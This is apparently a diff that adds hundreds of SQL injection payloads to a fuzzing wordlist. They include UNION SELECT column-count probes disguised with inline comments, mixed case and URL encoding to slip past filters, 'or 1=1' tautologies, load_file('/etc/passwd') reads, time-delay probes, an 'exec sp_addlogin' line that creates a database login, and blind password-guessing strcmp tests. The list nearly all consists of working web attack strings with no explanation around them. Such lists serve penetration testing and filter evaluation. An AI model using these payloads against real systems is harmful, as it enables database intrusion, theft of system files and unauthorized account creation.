+'/**/and/**/unIon(((((((selEct(1),(2),(3),(4),(5),(6))))))))/**/--/**/-
+'/**/and/**/unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7))))))))
+'/**/and/**/unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7))))))))--
+'/**/and/**/unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7))))))))/**/--
+'/**/and/**/unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7))))))))/**/--/**/-
+'/**/and/**/unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7),(8))))))))
+'/**/and/**/unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7),(8))))))))--
+'/**/and/**/unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7),(8))))))))/**/--
+'/**/and/**/unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7),(8))))))))/**/--/**/-
+'/**/and/**/unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7),(8),(9))))))))
+'/**/and/**/unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7),(8),(9))))))))--
+'/**/and/**/unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7),(8),(9))))))))/**/--
+'/**/and/**/unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7),(8),(9))))))))/**/--/**/-
+'/**/and/**/unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7),(8),(9),(10))))))))
+'/**/and/**/unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7),(8),(9),(10))))))))--
+'/**/and/**/unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7),(8),(9),(10))))))))/**/--
+'/**/and/**/unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7),(8),(9),(10))))))))/**/--/**/-
+'/**/and/**/union(((((((select(1))))))))
+'/**/and/**/union(((((((select(1))))))))--
+'/**/and/**/union(((((((select(1))))))))/**/--
+'/**/and/**/union(((((((select(1))))))))/**/--/**/-
+'/**/and/**/union(((((((select(1),(2))))))))
+'/**/and/**/union(((((((select(1),(2))))))))--
+'/**/and/**/union(((((((select(1),(2))))))))/**/--
+'/**/and/**/union(((((((select(1),(2))))))))/**/--/**/-
+'/**/and/**/union(((((((select(1),(2),(3))))))))
+'/**/and/**/union(((((((select(1),(2),(3))))))))--
+'/**/and/**/union(((((((select(1),(2),(3))))))))/**/--
+'/**/and/**/union(((((((select(1),(2),(3))))))))/**/--/**/-
+'/**/and/**/union(((((((select(1),(2),(3),(4))))))))
+'/**/and/**/union(((((((select(1),(2),(3),(4))))))))--
+'/**/and/**/union(((((((select(1),(2),(3),(4))))))))/**/--
+'/**/and/**/union(((((((select(1),(2),(3),(4))))))))/**/--/**/-
+'/**/and/**/union(((((((select(1),(2),(3),(4),(5))))))))
+'/**/and/**/union(((((((select(1),(2),(3),(4),(5))))))))--
+'/**/and/**/union(((((((select(1),(2),(3),(4),(5))))))))/**/--
+'/**/and/**/union(((((((select(1),(2),(3),(4),(5))))))))/**/--/**/-
+'/**/and/**/union(((((((select(1),(2),(3),(4),(5),(6))))))))
+'/**/and/**/union(((((((select(1),(2),(3),(4),(5),(6))))))))--
+'/**/and/**/union(((((((select(1),(2),(3),(4),(5),(6))))))))/**/--
+'/**/and/**/union(((((((select(1),(2),(3),(4),(5),(6))))))))/**/--/**/-
+'/**/and/**/union(((((((select(1),(2),(3),(4),(5),(6),(7))))))))
+'/**/and/**/union(((((((select(1),(2),(3),(4),(5),(6),(7))))))))--
+'/**/and/**/union(((((((select(1),(2),(3),(4),(5),(6),(7))))))))/**/--
+'/**/and/**/union(((((((select(1),(2),(3),(4),(5),(6),(7))))))))/**/--/**/-
+'/**/and/**/union(((((((select(1),(2),(3),(4),(5),(6),(7),(8))))))))
+'/**/and/**/union(((((((select(1),(2),(3),(4),(5),(6),(7),(8))))))))--
+'/**/and/**/union(((((((select(1),(2),(3),(4),(5),(6),(7),(8))))))))/**/--
+'/**/and/**/union(((((((select(1),(2),(3),(4),(5),(6),(7),(8))))))))/**/--/**/-
+'/**/and/**/union(((((((select(1),(2),(3),(4),(5),(6),(7),(8),(9))))))))
+'/**/and/**/union(((((((select(1),(2),(3),(4),(5),(6),(7),(8),(9))))))))--
+'/**/and/**/union(((((((select(1),(2),(3),(4),(5),(6),(7),(8),(9))))))))/**/--
+'/**/and/**/union(((((((select(1),(2),(3),(4),(5),(6),(7),(8),(9))))))))/**/--/**/-
+'/**/and/**/union(((((((select(1),(2),(3),(4),(5),(6),(7),(8),(9),(10))))))))
+'/**/and/**/union(((((((select(1),(2),(3),(4),(5),(6),(7),(8),(9),(10))))))))--
+'/**/and/**/union(((((((select(1),(2),(3),(4),(5),(6),(7),(8),(9),(10))))))))/**/--
+'/**/and/**/union(((((((select(1),(2),(3),(4),(5),(6),(7),(8),(9),(10))))))))/**/--/**/-
+'/**/and/**/union/**/select/**/load_file("/etc/passwd")--
+'/**/and/**/union/**/select/**/load_file("/etc/passwd")/**/
+'/**/and/**/union/**/select/**/load_file("/etc/passwd")/**/--
+'/**/and/**/union/**/select/**/load_file("/etc/passwd")/**/--/**/-
+'/**/or/**/'2'>'1
+'/**/or/**/'2'>'1'/**/or/**/'2'>'1
+'/**/or/**/'2'>'1'/**/or/**/'2'>'1--
+'/**/or/**/'2'>'1'/**/or/**/'2'>'1/**/--
+'/**/or/**/'2'>'1'/**/or/**/'2'>'1/**/--/**/-
+'/**/or/**/'2'>'1--
+'/**/or/**/'2'>'1/**/--
+'/**/or/**/'2'>'1/**/--/**/-
+'/**/or/**//*union*/union/*select*/select+1,2,3,4,5,6,7,8,9,10/*
+'/**/or/**//*union*/union/*select*/select+1,2,3,4,5,6,7,8,9/*
+'/**/or/**//*union*/union/*select*/select+1,2,3,4,5,6,7,8/*
+'/**/or/**//*union*/union/*select*/select+1,2,3,4,5,6,7/*
+'/**/or/**//*union*/union/*select*/select+1,2,3,4,5,6/*
+'/**/or/**//*union*/union/*select*/select+1,2,3,4,5/*
+'/**/or/**//*union*/union/*select*/select+1,2,3,4/*
+'/**/or/**//*union*/union/*select*/select+1,2,3/*
+'/**/or/**//*union*/union/*select*/select+1,2/*
+'/**/or/**//*union*/union/*select*/select+1/*
+'/**/or/**/1/**/or'
+'/**/or/**/1/**/or'--
+'/**/or/**/1/**/or'/**/--
+'/**/or/**/1/**/or'/**/--/**/-
+'/**/or/**/1=1#
+'/**/or/**/1=1--
+'/**/or/**/1=1/*
+'/**/or/**/un/**/ion+sel/**/ect+1
+'/**/or/**/un/**/ion+sel/**/ect+1,2
+'/**/or/**/un/**/ion+sel/**/ect+1,2,3
+'/**/or/**/un/**/ion+sel/**/ect+1,2,3,4
+'/**/or/**/un/**/ion+sel/**/ect+1,2,3,4,5
+'/**/or/**/un/**/ion+sel/**/ect+1,2,3,4,5,6
+'/**/or/**/un/**/ion+sel/**/ect+1,2,3,4,5,6,7
+'/**/or/**/un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8
+'/**/or/**/un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8,9
+'/**/or/**/un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8,9,10
+'/**/or/**/un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8,9,10--
+'/**/or/**/un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8,9,10/**/--
+'/**/or/**/un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8,9,10/**/--/**/-
+'/**/or/**/un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8,9--
+'/**/or/**/un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8,9/**/--
+'/**/or/**/un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8,9/**/--/**/-
+'/**/or/**/un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8--
+'/**/or/**/un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8/**/--
+'/**/or/**/un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8/**/--/**/-
+'/**/or/**/un/**/ion+sel/**/ect+1,2,3,4,5,6,7--
+'/**/or/**/un/**/ion+sel/**/ect+1,2,3,4,5,6,7/**/--
+'/**/or/**/un/**/ion+sel/**/ect+1,2,3,4,5,6,7/**/--/**/-
+'/**/or/**/un/**/ion+sel/**/ect+1,2,3,4,5,6--
+'/**/or/**/un/**/ion+sel/**/ect+1,2,3,4,5,6/**/--
+'/**/or/**/un/**/ion+sel/**/ect+1,2,3,4,5,6/**/--/**/-
+'/**/or/**/un/**/ion+sel/**/ect+1,2,3,4,5--
+'/**/or/**/un/**/ion+sel/**/ect+1,2,3,4,5/**/--
+'/**/or/**/un/**/ion+sel/**/ect+1,2,3,4,5/**/--/**/-
+'/**/or/**/un/**/ion+sel/**/ect+1,2,3,4--
+'/**/or/**/un/**/ion+sel/**/ect+1,2,3,4/**/--
+'/**/or/**/un/**/ion+sel/**/ect+1,2,3,4/**/--/**/-
+'/**/or/**/un/**/ion+sel/**/ect+1,2,3--
+'/**/or/**/un/**/ion+sel/**/ect+1,2,3/**/--
+'/**/or/**/un/**/ion+sel/**/ect+1,2,3/**/--/**/-
+'/**/or/**/un/**/ion+sel/**/ect+1,2--
+'/**/or/**/un/**/ion+sel/**/ect+1,2/**/--
+'/**/or/**/un/**/ion+sel/**/ect+1,2/**/--/**/-
+'/**/or/**/un/**/ion+sel/**/ect+1--
+'/**/or/**/un/**/ion+sel/**/ect+1/**/--
+'/**/or/**/un/**/ion+sel/**/ect+1/**/--/**/-
+'/**/or/**/unIon(((((((selEct(1))))))))
+'/**/or/**/unIon(((((((selEct(1))))))))--
+'/**/or/**/unIon(((((((selEct(1))))))))/**/--
+'/**/or/**/unIon(((((((selEct(1))))))))/**/--/**/-
+'/**/or/**/unIon(((((((selEct(1),(2))))))))
+'/**/or/**/unIon(((((((selEct(1),(2))))))))--
+'/**/or/**/unIon(((((((selEct(1),(2))))))))/**/--
+'/**/or/**/unIon(((((((selEct(1),(2))))))))/**/--/**/-
+'/**/or/**/unIon(((((((selEct(1),(2),(3))))))))
+'/**/or/**/unIon(((((((selEct(1),(2),(3))))))))--
+'/**/or/**/unIon(((((((selEct(1),(2),(3))))))))/**/--
+'/**/or/**/unIon(((((((selEct(1),(2),(3))))))))/**/--/**/-
+'/**/or/**/unIon(((((((selEct(1),(2),(3),(4))))))))
+'/**/or/**/unIon(((((((selEct(1),(2),(3),(4))))))))--
+'/**/or/**/unIon(((((((selEct(1),(2),(3),(4))))))))/**/--
+'/**/or/**/unIon(((((((selEct(1),(2),(3),(4))))))))/**/--/**/-
+'/**/or/**/unIon(((((((selEct(1),(2),(3),(4),(5))))))))
+'/**/or/**/unIon(((((((selEct(1),(2),(3),(4),(5))))))))--
+'/**/or/**/unIon(((((((selEct(1),(2),(3),(4),(5))))))))/**/--
+'/**/or/**/unIon(((((((selEct(1),(2),(3),(4),(5))))))))/**/--/**/-
+'/**/or/**/unIon(((((((selEct(1),(2),(3),(4),(5),(6))))))))
+'/**/or/**/unIon(((((((selEct(1),(2),(3),(4),(5),(6))))))))--
+'/**/or/**/unIon(((((((selEct(1),(2),(3),(4),(5),(6))))))))/**/--
+'/**/or/**/unIon(((((((selEct(1),(2),(3),(4),(5),(6))))))))/**/--/**/-
+'/**/or/**/unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7))))))))
+'/**/or/**/unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7))))))))--
+'/**/or/**/unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7))))))))/**/--
+'/**/or/**/unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7))))))))/**/--/**/-
+'/**/or/**/unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7),(8))))))))
+'/**/or/**/unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7),(8))))))))--
+'/**/or/**/unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7),(8))))))))/**/--
+'/**/or/**/unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7),(8))))))))/**/--/**/-
+'/**/or/**/unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7),(8),(9))))))))
+'/**/or/**/unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7),(8),(9))))))))--
+'/**/or/**/unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7),(8),(9))))))))/**/--
+'/**/or/**/unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7),(8),(9))))))))/**/--/**/-
+'/**/or/**/unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7),(8),(9),(10))))))))
+'/**/or/**/unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7),(8),(9),(10))))))))--
+'/**/or/**/unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7),(8),(9),(10))))))))/**/--
+'/**/or/**/unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7),(8),(9),(10))))))))/**/--/**/-
+'/**/or/**/union(((((((select(1))))))))
+'/**/or/**/union(((((((select(1))))))))--
+'/**/or/**/union(((((((select(1))))))))/**/--
+'/**/or/**/union(((((((select(1))))))))/**/--/**/-
+'/**/or/**/union(((((((select(1),(2))))))))
+'/**/or/**/union(((((((select(1),(2))))))))--
+'/**/or/**/union(((((((select(1),(2))))))))/**/--
+'/**/or/**/union(((((((select(1),(2))))))))/**/--/**/-
+'/**/or/**/union(((((((select(1),(2),(3))))))))
+'/**/or/**/union(((((((select(1),(2),(3))))))))--
+'/**/or/**/union(((((((select(1),(2),(3))))))))/**/--
+'/**/or/**/union(((((((select(1),(2),(3))))))))/**/--/**/-
+'/**/or/**/union(((((((select(1),(2),(3),(4))))))))
+'/**/or/**/union(((((((select(1),(2),(3),(4))))))))--
+'/**/or/**/union(((((((select(1),(2),(3),(4))))))))/**/--
+'/**/or/**/union(((((((select(1),(2),(3),(4))))))))/**/--/**/-
+'/**/or/**/union(((((((select(1),(2),(3),(4),(5))))))))
+'/**/or/**/union(((((((select(1),(2),(3),(4),(5))))))))--
+'/**/or/**/union(((((((select(1),(2),(3),(4),(5))))))))/**/--
+'/**/or/**/union(((((((select(1),(2),(3),(4),(5))))))))/**/--/**/-
+'/**/or/**/union(((((((select(1),(2),(3),(4),(5),(6))))))))
+'/**/or/**/union(((((((select(1),(2),(3),(4),(5),(6))))))))--
+'/**/or/**/union(((((((select(1),(2),(3),(4),(5),(6))))))))/**/--
+'/**/or/**/union(((((((select(1),(2),(3),(4),(5),(6))))))))/**/--/**/-
+'/**/or/**/union(((((((select(1),(2),(3),(4),(5),(6),(7))))))))
+'/**/or/**/union(((((((select(1),(2),(3),(4),(5),(6),(7))))))))--
+'/**/or/**/union(((((((select(1),(2),(3),(4),(5),(6),(7))))))))/**/--
+'/**/or/**/union(((((((select(1),(2),(3),(4),(5),(6),(7))))))))/**/--/**/-
+'/**/or/**/union(((((((select(1),(2),(3),(4),(5),(6),(7),(8))))))))
+'/**/or/**/union(((((((select(1),(2),(3),(4),(5),(6),(7),(8))))))))--
+'/**/or/**/union(((((((select(1),(2),(3),(4),(5),(6),(7),(8))))))))/**/--
+'/**/or/**/union(((((((select(1),(2),(3),(4),(5),(6),(7),(8))))))))/**/--/**/-
+'/**/or/**/union(((((((select(1),(2),(3),(4),(5),(6),(7),(8),(9))))))))
+'/**/or/**/union(((((((select(1),(2),(3),(4),(5),(6),(7),(8),(9))))))))--
+'/**/or/**/union(((((((select(1),(2),(3),(4),(5),(6),(7),(8),(9))))))))/**/--
+'/**/or/**/union(((((((select(1),(2),(3),(4),(5),(6),(7),(8),(9))))))))/**/--/**/-
+'/**/or/**/union(((((((select(1),(2),(3),(4),(5),(6),(7),(8),(9),(10))))))))
+'/**/or/**/union(((((((select(1),(2),(3),(4),(5),(6),(7),(8),(9),(10))))))))--
+'/**/or/**/union(((((((select(1),(2),(3),(4),(5),(6),(7),(8),(9),(10))))))))/**/--
+'/**/or/**/union(((((((select(1),(2),(3),(4),(5),(6),(7),(8),(9),(10))))))))/**/--/**/-
+'/**/or/**/union/**/select/**/load_file("/etc/passwd")--
+'/**/or/**/union/**/select/**/load_file("/etc/passwd")/**/
+'/**/or/**/union/**/select/**/load_file("/etc/passwd")/**/--
+'/**/or/**/union/**/select/**/load_file("/etc/passwd")/**/--/**/-
 ';waitfor delay '0:0:__TIME__'--
 'OR '' = '
 'OR 1=1--
 '^'
 'exec sp_addlogin 'name' , 'password' --
 'hi' or 'x'='x';
+'||1
+'||1 --
+'||1 -- -
+'||1#
+'||1--
+'||1/**/--
+'||1/**/--/**/-
+'||1||'1'<>'2
+'||1||'1'<>'2 --
+'||1||'1'<>'2 -- -
+'||1||'1'<>'2--
+'||1||'1'<>'2/**/--
+'||1||'1'<>'2/**/--/**/-
 (
 ((
 ()
+(1);exec('sel'+'ect'(1))
+(1)or(0x50=0x50)
+(1)unIon(((((((selEct(1))))))))
+(1)unIon(((((((selEct(1)))))))) --
+(1)unIon(((((((selEct(1)))))))) -- -
+(1)unIon(((((((selEct(1))))))))--
+(1)unIon(((((((selEct(1))))))))/**/--
+(1)unIon(((((((selEct(1))))))))/**/--/**/-
+(1)unIon(((((((selEct(1),(2))))))))
+(1)unIon(((((((selEct(1),(2)))))))) --
+(1)unIon(((((((selEct(1),(2)))))))) -- -
+(1)unIon(((((((selEct(1),(2))))))))--
+(1)unIon(((((((selEct(1),(2))))))))/**/--
+(1)unIon(((((((selEct(1),(2))))))))/**/--/**/-
+(1)unIon(((((((selEct(1),(2),(3))))))))
+(1)unIon(((((((selEct(1),(2),(3)))))))) --
+(1)unIon(((((((selEct(1),(2),(3)))))))) -- -
+(1)unIon(((((((selEct(1),(2),(3))))))))--
+(1)unIon(((((((selEct(1),(2),(3))))))))/**/--
+(1)unIon(((((((selEct(1),(2),(3))))))))/**/--/**/-
+(1)unIon(((((((selEct(1),(2),(3),(4))))))))
+(1)unIon(((((((selEct(1),(2),(3),(4)))))))) --
+(1)unIon(((((((selEct(1),(2),(3),(4)))))))) -- -
+(1)unIon(((((((selEct(1),(2),(3),(4))))))))--
+(1)unIon(((((((selEct(1),(2),(3),(4))))))))/**/--
+(1)unIon(((((((selEct(1),(2),(3),(4))))))))/**/--/**/-
+(1)unIon(((((((selEct(1),(2),(3),(4),(5))))))))
+(1)unIon(((((((selEct(1),(2),(3),(4),(5)))))))) --
+(1)unIon(((((((selEct(1),(2),(3),(4),(5)))))))) -- -
+(1)unIon(((((((selEct(1),(2),(3),(4),(5))))))))--
+(1)unIon(((((((selEct(1),(2),(3),(4),(5))))))))/**/--
+(1)unIon(((((((selEct(1),(2),(3),(4),(5))))))))/**/--/**/-
+(1)unIon(((((((selEct(1),(2),(3),(4),(5),(6))))))))
+(1)unIon(((((((selEct(1),(2),(3),(4),(5),(6)))))))) --
+(1)unIon(((((((selEct(1),(2),(3),(4),(5),(6)))))))) -- -
+(1)unIon(((((((selEct(1),(2),(3),(4),(5),(6))))))))--
+(1)unIon(((((((selEct(1),(2),(3),(4),(5),(6))))))))/**/--
+(1)unIon(((((((selEct(1),(2),(3),(4),(5),(6))))))))/**/--/**/-
+(1)unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7))))))))
+(1)unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7)))))))) --
+(1)unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7)))))))) -- -
+(1)unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7))))))))--
+(1)unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7))))))))/**/--
+(1)unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7))))))))/**/--/**/-
+(1)unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7),(8))))))))
+(1)unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7),(8)))))))) --
+(1)unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7),(8)))))))) -- -
+(1)unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7),(8))))))))--
+(1)unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7),(8))))))))/**/--
+(1)unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7),(8))))))))/**/--/**/-
+(1)unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7),(8),(9))))))))
+(1)unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7),(8),(9)))))))) --
+(1)unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7),(8),(9)))))))) -- -
+(1)unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7),(8),(9))))))))--
+(1)unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7),(8),(9))))))))/**/--
+(1)unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7),(8),(9))))))))/**/--/**/-
+(1)unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7),(8),(9),(10))))))))
+(1)unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7),(8),(9),(10)))))))) --
+(1)unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7),(8),(9),(10)))))))) -- -
+(1)unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7),(8),(9),(10))))))))--
+(1)unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7),(8),(9),(10))))))))/**/--
+(1)unIon(((((((selEct(1),(2),(3),(4),(5),(6),(7),(8),(9),(10))))))))/**/--/**/-
+(1)union(((((((select(1))))))))
+(1)union(((((((select(1)))))))) --
+(1)union(((((((select(1)))))))) -- -
+(1)union(((((((select(1))))))))--
+(1)union(((((((select(1))))))))/**/--
+(1)union(((((((select(1))))))))/**/--/**/-
+(1)union(((((((select(1),(2))))))))
+(1)union(((((((select(1),(2)))))))) --
+(1)union(((((((select(1),(2)))))))) -- -
+(1)union(((((((select(1),(2))))))))--
+(1)union(((((((select(1),(2))))))))/**/--
+(1)union(((((((select(1),(2))))))))/**/--/**/-
+(1)union(((((((select(1),(2),(3))))))))
+(1)union(((((((select(1),(2),(3)))))))) --
+(1)union(((((((select(1),(2),(3)))))))) -- -
+(1)union(((((((select(1),(2),(3))))))))--
+(1)union(((((((select(1),(2),(3))))))))/**/--
+(1)union(((((((select(1),(2),(3))))))))/**/--/**/-
+(1)union(((((((select(1),(2),(3),(4))))))))
+(1)union(((((((select(1),(2),(3),(4)))))))) --
+(1)union(((((((select(1),(2),(3),(4)))))))) -- -
+(1)union(((((((select(1),(2),(3),(4))))))))--
+(1)union(((((((select(1),(2),(3),(4))))))))/**/--
+(1)union(((((((select(1),(2),(3),(4))))))))/**/--/**/-
+(1)union(((((((select(1),(2),(3),(4),(5))))))))
+(1)union(((((((select(1),(2),(3),(4),(5)))))))) --
+(1)union(((((((select(1),(2),(3),(4),(5)))))))) -- -
+(1)union(((((((select(1),(2),(3),(4),(5))))))))--
+(1)union(((((((select(1),(2),(3),(4),(5))))))))/**/--
+(1)union(((((((select(1),(2),(3),(4),(5))))))))/**/--/**/-
+(1)union(((((((select(1),(2),(3),(4),(5),(6))))))))
+(1)union(((((((select(1),(2),(3),(4),(5),(6)))))))) --
+(1)union(((((((select(1),(2),(3),(4),(5),(6)))))))) -- -
+(1)union(((((((select(1),(2),(3),(4),(5),(6))))))))--
+(1)union(((((((select(1),(2),(3),(4),(5),(6))))))))/**/--
+(1)union(((((((select(1),(2),(3),(4),(5),(6))))))))/**/--/**/-
+(1)union(((((((select(1),(2),(3),(4),(5),(6),(7))))))))
+(1)union(((((((select(1),(2),(3),(4),(5),(6),(7)))))))) --
+(1)union(((((((select(1),(2),(3),(4),(5),(6),(7)))))))) -- -
+(1)union(((((((select(1),(2),(3),(4),(5),(6),(7))))))))--
+(1)union(((((((select(1),(2),(3),(4),(5),(6),(7))))))))/**/--
+(1)union(((((((select(1),(2),(3),(4),(5),(6),(7))))))))/**/--/**/-
+(1)union(((((((select(1),(2),(3),(4),(5),(6),(7),(8))))))))
+(1)union(((((((select(1),(2),(3),(4),(5),(6),(7),(8)))))))) --
+(1)union(((((((select(1),(2),(3),(4),(5),(6),(7),(8)))))))) -- -
+(1)union(((((((select(1),(2),(3),(4),(5),(6),(7),(8))))))))--
+(1)union(((((((select(1),(2),(3),(4),(5),(6),(7),(8))))))))/**/--
+(1)union(((((((select(1),(2),(3),(4),(5),(6),(7),(8))))))))/**/--/**/-
+(1)union(((((((select(1),(2),(3),(4),(5),(6),(7),(8),(9))))))))
+(1)union(((((((select(1),(2),(3),(4),(5),(6),(7),(8),(9)))))))) --
+(1)union(((((((select(1),(2),(3),(4),(5),(6),(7),(8),(9)))))))) -- -
+(1)union(((((((select(1),(2),(3),(4),(5),(6),(7),(8),(9))))))))--
+(1)union(((((((select(1),(2),(3),(4),(5),(6),(7),(8),(9))))))))/**/--
+(1)union(((((((select(1),(2),(3),(4),(5),(6),(7),(8),(9))))))))/**/--/**/-
+(1)union(((((((select(1),(2),(3),(4),(5),(6),(7),(8),(9),(10))))))))
+(1)union(((((((select(1),(2),(3),(4),(5),(6),(7),(8),(9),(10)))))))) --
+(1)union(((((((select(1),(2),(3),(4),(5),(6),(7),(8),(9),(10)))))))) -- -
+(1)union(((((((select(1),(2),(3),(4),(5),(6),(7),(8),(9),(10))))))))--
+(1)union(((((((select(1),(2),(3),(4),(5),(6),(7),(8),(9),(10))))))))/**/--
+(1)union(((((((select(1),(2),(3),(4),(5),(6),(7),(8),(9),(10))))))))/**/--/**/-
 (SELECT CAST(VERSION() AS NUMERIC)
 (SELECT CAST(VERSION() AS NUMERIC) --
 (SELECT CAST(VERSION() AS NUMERIC) -- -
@@ -586,6 +1685,12 @@ $
 +UNunionION+SEselectLECT+1,2,3--
 +UNunionION+SEselectLECT+1,2--
 +UNunionION+SEselectLECT+1--
++and+5!=6
++and+5!=6 --
++and+5!=6 -- -
++and+5!=6--
++and+5!=6/**/--
++and+5!=6/**/--/**/-
 +un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8,9,10--
 +un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8,9--
 +un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8--
@@ -771,7 +1876,324 @@ $
 /*!u%6eion*/ /*!se%6cect*/ 1,2,3--
 /*!u%6eion*/ /*!se%6cect*/ 1,2--
 /*!u%6eion*/ /*!se%6cect*/ 1--
+/**/'/**/OR/**/SELECT/**/CHAR(0x66)
+/**//**/strcmp(left('password',1),/**/0x69)/**/=/**/1/**/--/**/-
+/**/AND/**/SELECT/**/0x5045
+/**/AND/**/SELECT/**/0x5045--
+/**/AND/**/SELECT/**/0x5045/**/--
+/**/AND/**/SELECT/**/0x5045/**/--/**/-
+/**/AND/**/SELECT/**/CHAR(0x66)
+/**/AND/**/SELECT/**/CHAR(0x66)--
+/**/AND/**/SELECT/**/CHAR(0x66)/**/--
+/**/AND/**/SELECT/**/CHAR(0x66)/**/--/**/-
+/**/AND/**/SELECT/**/CONCAT(CHAR(72),CHAR(65),CHAR(67),CHAR(75),CHAR(69),CHAR(82))
+/**/AND/**/SELECT/**/CONCAT(CHAR(72),CHAR(65),CHAR(67),CHAR(75),CHAR(69),CHAR(82))--
+/**/AND/**/SELECT/**/CONCAT(CHAR(72),CHAR(65),CHAR(67),CHAR(75),CHAR(69),CHAR(82))/**/--
+/**/AND/**/SELECT/**/CONCAT(CHAR(72),CHAR(65),CHAR(67),CHAR(75),CHAR(69),CHAR(82))/**/--/**/-
+/**/AND/**/strcmp(left('password',1),/**/0x69)/**/=/**/1--/**/
+/**/AND/**/strcmp(left('password',1),/**/0x69)/**/=/**/1/**/
+/**/AND/**/strcmp(left('password',1),/**/0x69)/**/=/**/1/**/--/**/
+/**/AND/**/strcmp(left('password',1),/**/0x69)/**/=/**/1/**/--/**/-
+/**/OR/**/SELECT/**/0x5045
+/**/OR/**/SELECT/**/0x5045--
+/**/OR/**/SELECT/**/0x5045/**/--
+/**/OR/**/SELECT/**/0x5045/**/--/**/-
+/**/OR/**/SELECT/**/CHAR(0x66)
+/**/OR/**/SELECT/**/CHAR(0x66)--
+/**/OR/**/SELECT/**/CHAR(0x66)/**/--
+/**/OR/**/SELECT/**/CHAR(0x66)/**/--/**/-
+/**/OR/**/SELECT/**/CONCAT(CHAR(72),CHAR(65),CHAR(67),CHAR(75),CHAR(69),CHAR(82))
+/**/OR/**/SELECT/**/CONCAT(CHAR(72),CHAR(65),CHAR(67),CHAR(75),CHAR(69),CHAR(82))--
+/**/OR/**/SELECT/**/CONCAT(CHAR(72),CHAR(65),CHAR(67),CHAR(75),CHAR(69),CHAR(82))/**/--
+/**/OR/**/SELECT/**/CONCAT(CHAR(72),CHAR(65),CHAR(67),CHAR(75),CHAR(69),CHAR(82))/**/--/**/-
+/**/OR/**/strcmp(left('password',1),/**/0x69)/**/=/**/1
+/**/OR/**/strcmp(left('password',1),/**/0x69)/**/=/**/1--
+/**/OR/**/strcmp(left('password',1),/**/0x69)/**/=/**/1/**/--
+/**/OR/**/strcmp(left('password',1),/**/0x69)/**/=/**/1/**/--/**/-
+/**/SELECT/**/0x5045
+/**/SELECT/**/0x5045--
+/**/SELECT/**/0x5045/**/--
+/**/SELECT/**/0x5045/**/--/**/-
+/**/SELECT/**/CHAR(0x66)--
+/**/SELECT/**/CHAR(0x66)/**/--
+/**/SELECT/**/CHAR(0x66)/**/--/**/-
+/**/SELECT/**/CHAR(0x66)/**/--/**/-/**/
+/**/and+5!=6
+/**/and+5!=6--
+/**/and+5!=6/**/--
+/**/and+5!=6/**/--/**/-/**/
+/**/and/**//*union*/union/*select*/select+1,2,3,4,5,6,7,8,9,10/*/**/
+/**/and/**//*union*/union/*select*/select+1,2,3,4,5,6,7,8,9/*
+/**/and/**//*union*/union/*select*/select+1,2,3,4,5,6,7,8/*
+/**/and/**//*union*/union/*select*/select+1,2,3,4,5,6,7/*
+/**/and/**//*union*/union/*select*/select+1,2,3,4,5,6/*
+/**/and/**//*union*/union/*select*/select+1,2,3,4,5/*
